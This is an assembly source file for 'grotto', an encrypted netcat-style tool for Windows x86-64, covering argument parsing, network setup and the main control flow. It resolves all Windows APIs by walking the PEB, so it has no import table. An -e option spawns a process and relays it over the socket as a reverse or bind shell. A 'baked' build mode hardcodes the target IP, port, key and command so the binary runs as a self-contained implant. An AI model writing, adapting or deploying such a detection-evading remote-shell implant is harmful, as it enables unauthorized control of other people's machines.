; grotto - encrypted netcat (Windows x86-64)
; Entry point, CLI parsing, orchestration
; All Win32 APIs resolved via PEB walking (no imports)

default rel
bits 64

%ifdef BAKED
%include "baked.inc"
%endif

section .text
global _start

; ============================================================================
; strlen - get length of null-terminated string
; Input:  rdi = pointer to string (System V convention for internal use)
; Output: rax = length
; ============================================================================
strlen:
    xor     eax, eax
.loop:
    cmp     byte [rdi + rax], 0
    je      .done
    inc     rax
    jmp     .loop
.done:
    ret

; ============================================================================
; parse_ipv4 - convert "A.B.C.D" string to 32-bit network-order dword
; Input:  rdi = pointer to dotted-decimal string
; Output: eax = IPv4 address in network byte order
; ============================================================================
parse_ipv4:
    xor     eax, eax
    xor     ecx, ecx
    xor     edx, edx

.loop:
    movzx   r8d, byte [rdi]
    test    r8b, r8b
    jz      .store_last
    cmp     r8b, '.'
    je      .store_octet
    imul    ecx, ecx, 10
    sub     r8d, '0'
    add     ecx, r8d
    inc     rdi
    jmp     .loop

.store_octet:
    mov     byte [rsp - 8 + rdx], cl
    xor     ecx, ecx
    inc     edx
    inc     rdi
    jmp     .loop

.store_last:
    mov     byte [rsp - 8 + rdx], cl
    mov     eax, [rsp - 8]
    ret

; ============================================================================
; parse_port - convert decimal string to 16-bit network byte order
; Input:  rdi = pointer to decimal string
; Output: ax = port in network byte order
; ============================================================================
parse_port:
    xor     eax, eax
.loop:
    movzx   ecx, byte [rdi]
    test    cl, cl
    jz      .done
    imul    eax, eax, 10
    sub     ecx, '0'
    add     eax, ecx
    inc     rdi
    jmp     .loop
.done:
    xchg    al, ah
    ret

; ============================================================================
; parse_hex - convert 64-char hex string to 32 bytes
; Input:  rdi = pointer to hex string
;         rsi = pointer to output buffer (32 bytes)
; ============================================================================
parse_hex:
    mov     ecx, 32
.loop:
    movzx   eax, byte [rdi]
    call    .hex_digit
    shl     al, 4
    mov     dl, al
    movzx   eax, byte [rdi + 1]
    call    .hex_digit
    or      dl, al
    mov     [rsi], dl
    add     rdi, 2
    inc     rsi
    dec     ecx
    jnz     .loop
    ret

.hex_digit:
    cmp     al, '9'
    jbe     .is_digit
    cmp     al, 'F'
    jbe     .is_upper
    sub     al, 'a' - 10
    ret
.is_upper:
    sub     al, 'A' - 10
    ret
.is_digit:
    sub     al, '0'
    ret

; ============================================================================
; skip_spaces - advance pointer past spaces/tabs
; Input:  rdi = pointer into string
; Output: rdi = pointer to next non-space character
; ============================================================================
skip_spaces:
    movzx   eax, byte [rdi]
    cmp     al, ' '
    je      .skip
    cmp     al, 9              ; tab
    je      .skip
    ret
.skip:
    inc     rdi
    jmp     skip_spaces

; ============================================================================
; find_token_end - find end of current token (space, tab, or null)
; Input:  rdi = pointer to start of token
; Output: rdi = pointer to terminator (space/tab/null)
; ============================================================================
find_token_end:
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done
    cmp     al, ' '
    je      .done
    cmp     al, 9
    je      .done
    inc     rdi
    jmp     find_token_end
.done:
    ret

; ============================================================================
; Include Windows-specific modules and shared crypto
; peb.asm must come first to define API_* constants used everywhere
; ============================================================================
%include "peb.asm"
%include "aead.inc"
%include "net.asm"
%include "crypto.asm"
%include "io.asm"
%include "shell.asm"

; ============================================================================
; cleanup_and_exit - zero key, terminate child, exit(0)
; Expects r15 = api_table pointer
; ============================================================================
cleanup_and_exit:
    ; Force stack alignment (entered via jmp, never returns)
    and     rsp, -16

    ; Zero the key in memory
    lea     rdi, [rel g_key]
    xor     eax, eax
    mov     ecx, 32
    rep     stosb

    ; Terminate child process if spawned
    mov     rcx, [rel g_child_process]
    test    rcx, rcx
    jz      .no_child
    ; TerminateProcess(hProcess, 0)
    xor     edx, edx
    sub     rsp, 32
    call    [r15 + API_TerminateProcess * 8]
    add     rsp, 32
    ; CloseHandle(hProcess)
    mov     rcx, [rel g_child_process]
    sub     rsp, 32
    call    [r15 + API_CloseHandle * 8]
    add     rsp, 32
.no_child:
    ; ExitProcess(0)
    xor     ecx, ecx
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]
    ; Does not return

; ============================================================================
; _start - Entry point
; ============================================================================
_start:
    ; Align stack to 16 bytes (Windows entry jumps here, rsp is arbitrary)
    and     rsp, -16

    ; Save callee-saved registers
    push    rbx
    push    rbp
    push    rdi
    push    rsi
    push    r12
    push    r13
    push    r14
    push    r15

    ; Allocate api_table + scratch space
    sub     rsp, 64                 ; scratch/shadow space

    ; r15 = api_table (global, in .bss)
    lea     r15, [rel api_table]

    ; Initialize tracking flags
    xor     eax, eax
    mov     [rel g_has_listen], al
    mov     [rel g_has_connect], al
    mov     [rel g_has_port], al
    mov     [rel g_has_key], al
    mov     byte [rel g_mode], 0xFF
    mov     qword [rel g_exec], 0
    mov     qword [rel g_child_process], 0
    mov     qword [rel g_sockfd], 0

    ; --- Step 1: Resolve all APIs ---
    call    resolve_all_apis

%ifdef BAKED
    ; Baked configuration — skip CLI parsing
    mov     byte [rel g_mode], BAKED_MODE
  %if BAKED_MODE == 0
    mov     dword [rel g_host], BAKED_IP_DWORD
  %endif
    mov     word [rel g_port], BAKED_PORT_NET
    cld
    lea     rsi, [rel baked_key_data]
    lea     rdi, [rel g_key]
    mov     ecx, 32
    rep     movsb
  %ifdef BAKED_HAS_EXEC
    lea     rax, [rel baked_exec_data]
    mov     [rel g_exec], rax
  %endif
    jmp     .init_network
%endif

    ; --- Step 2: Get command line string ---
    sub     rsp, 32
    call    [r15 + API_GetCommandLineA * 8]
    add     rsp, 32
    ; rax = pointer to full command line string
    mov     rdi, rax                ; rdi = command line pointer

    ; --- Step 3: Parse command line ---
    ; Skip the executable name (first token, may be quoted)
    cmp     byte [rdi], '"'
    jne     .skip_exe_unquoted

    ; Quoted exe name: skip until closing quote
    inc     rdi
.skip_quoted:
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done_parsing
    cmp     al, '"'
    je      .skip_quoted_end
    inc     rdi
    jmp     .skip_quoted
.skip_quoted_end:
    inc     rdi                     ; skip closing quote
    jmp     .skip_exe_done

.skip_exe_unquoted:
    call    find_token_end

.skip_exe_done:
    ; rdi now points past exe name
    call    skip_spaces

.arg_loop:
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done_parsing

    ; Check for '-' prefix
    cmp     al, '-'
    jne     .skip_token

    movzx   eax, byte [rdi + 1]

    cmp     al, 'l'
    je      .flag_listen
    cmp     al, 'c'
    je      .flag_connect
    cmp     al, 'p'
    je      .flag_port
    cmp     al, 'k'
    je      .flag_key
    cmp     al, 'e'
    je      .flag_exec
    jmp     .skip_token

.flag_listen:
    mov     byte [rel g_has_listen], 1
    mov     byte [rel g_mode], 1
    add     rdi, 2                  ; skip "-l"
    call    skip_spaces
    jmp     .arg_loop

.flag_connect:
    mov     byte [rel g_has_connect], 1
    mov     byte [rel g_mode], 0
    add     rdi, 2                  ; skip "-c"
    call    skip_spaces
    ; Next token is the host
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done_parsing
    ; Null-terminate the host token by finding end and writing null
    mov     r12, rdi                ; save start of host
    call    find_token_end
    mov     byte [rdi], 0           ; null-terminate host
    push    rdi                     ; save position
    mov     rdi, r12
    call    parse_ipv4
    mov     [rel g_host], eax
    pop     rdi
    inc     rdi                     ; skip past null we wrote (restore to next char)
    call    skip_spaces
    jmp     .arg_loop

.flag_port:
    mov     byte [rel g_has_port], 1
    add     rdi, 2
    call    skip_spaces
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done_parsing
    mov     r12, rdi
    call    find_token_end
    mov     byte [rdi], 0
    push    rdi
    mov     rdi, r12
    call    parse_port
    mov     [rel g_port], ax
    pop     rdi
    inc     rdi
    call    skip_spaces
    jmp     .arg_loop

.flag_key:
    mov     byte [rel g_has_key], 1
    add     rdi, 2
    call    skip_spaces
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done_parsing
    mov     r12, rdi
    call    find_token_end
    mov     byte [rdi], 0
    push    rdi
    mov     rdi, r12
    lea     rsi, [rel g_key]
    call    parse_hex
    pop     rdi
    inc     rdi
    call    skip_spaces
    jmp     .arg_loop

.flag_exec:
    add     rdi, 2
    call    skip_spaces
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done_parsing
    ; Store pointer to exec command (rest until next flag or end)
    mov     [rel g_exec], rdi
    call    find_token_end
    ; Check if we hit end of string
    movzx   eax, byte [rdi]
    test    al, al
    jz      .done_parsing
    mov     byte [rdi], 0           ; null-terminate exec arg
    inc     rdi
    call    skip_spaces
    jmp     .arg_loop

.skip_token:
    call    find_token_end
    call    skip_spaces
    jmp     .arg_loop

.done_parsing:
    ; --- Validation ---
    ; Check for conflict: both -l and -c
    mov     al, [rel g_has_listen]
    test    al, al
    jz      .no_conflict
    mov     al, [rel g_has_connect]
    test    al, al
    jz      .no_conflict
    jmp     .exit_error

.no_conflict:
    cmp     byte [rel g_mode], 0xFF
    je      .exit_error

    cmp     byte [rel g_has_port], 0
    je      .exit_error

    cmp     byte [rel g_has_key], 0
    je      .exit_error

.init_network:
    ; --- Step 4: Initialize Winsock ---
    call    net_init
    test    eax, eax
    jnz     .exit_error

    ; --- Step 5: Connect or listen ---
    cmp     byte [rel g_mode], 1
    je      .listen_mode

.connect_mode:
    mov     ecx, [rel g_host]
    mov     dx, [rel g_port]
    call    net_connect
    cmp     rax, -1
    je      .exit_error
    mov     [rel g_sockfd], rax
    jmp     .connected

.listen_mode:
    mov     cx, [rel g_port]
    call    net_listen
    cmp     rax, -1
    je      .exit_error
    mov     [rel g_sockfd], rax

.connected:
    ; --- Step 6: Check -e flag ---
    cmp     qword [rel g_exec], 0
    jne     .do_spawn_shell

    ; No -e: relay between socket and stdin/stdout handles
    ; GetStdHandle(STD_INPUT_HANDLE = -10)
    mov     ecx, -10
    sub     rsp, 32
    call    [r15 + API_GetStdHandle * 8]
    add     rsp, 32
    mov     r12, rax                ; stdin handle

    ; GetStdHandle(STD_OUTPUT_HANDLE = -11)
    mov     ecx, -11
    sub     rsp, 32
    call    [r15 + API_GetStdHandle * 8]
    add     rsp, 32
    mov     r13, rax                ; stdout handle

    ; relay_start(socket, local_read=stdin, local_write=stdout)
    mov     rcx, [rel g_sockfd]
    mov     rdx, r12                ; stdin = local_read
    mov     r8, r13                 ; stdout = local_write
    call    relay_start
    ; relay_start does not return (calls cleanup_and_exit)

.do_spawn_shell:
    ; spawn_shell(cmd) -> rax=stdout_read, rdx=stdin_write, r8=process_handle
    mov     rcx, [rel g_exec]
    call    spawn_shell
    cmp     rax, -1
    je      .exit_error

    ; rax = child stdout_read (we read from this = local_read)
    ; rdx = child stdin_write (we write to this = local_write)
    mov     r12, rax                ; local_read = child stdout pipe
    mov     r13, rdx                ; local_write = child stdin pipe

    ; relay_start(socket, local_read, local_write)
    mov     rcx, [rel g_sockfd]
    mov     rdx, r12
    mov     r8, r13
    call    relay_start
    ; Does not return

.exit_error:
    ; ExitProcess(1)
    mov     ecx, 1
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]
    ; Does not return

; ============================================================================
; Data sections
; ============================================================================
section .bss bss write align=8
    g_mode:          resb 1
    g_has_listen:    resb 1
    g_has_connect:   resb 1
    g_has_port:      resb 1
    g_has_key:       resb 1
                     resb 3         ; padding for alignment
    g_host:          resd 1
    g_port:          resw 1
                     resb 6         ; padding
    g_key:           resb 32
    g_exec:          resq 1
    g_sockfd:        resq 1
    g_child_process: resq 1
    g_thread1:       resq 1
    g_thread2:       resq 1
    g_local_read:    resq 1
    g_local_write:   resq 1
    api_table:       resq API_COUNT
